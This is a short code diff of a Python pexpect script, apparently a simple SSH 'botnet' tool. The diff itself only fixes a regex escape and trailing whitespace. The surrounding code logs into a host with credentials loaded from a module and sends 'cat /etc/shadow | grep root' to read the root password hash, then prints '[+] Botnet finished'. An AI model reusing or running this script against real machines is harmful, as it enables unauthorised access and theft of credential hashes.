@@ -7,7 +7,7 @@ import pexpect
 sys.path.append(os.path.realpath('../../..'))
 from jackmanimation.gameitems.gamefunctions import credscheck
 
-PROMPT = ['# ', '>>> ', '> ', '\$ ']
+PROMPT = ['# ', '>>> ', '> ', r'\$ ']
 
 def send_command(child, cmd):
     '''send command to bot'''
@@ -43,7 +43,7 @@ def main():
     password = botid["password"]
     child = connect(user, host, password)
     send_command(child, 'cat /etc/shadow | grep root')
-    print('[+] Botnet finished')   
-    
+    print('[+] Botnet finished')
+
 if __name__ == '__main__':
     main()
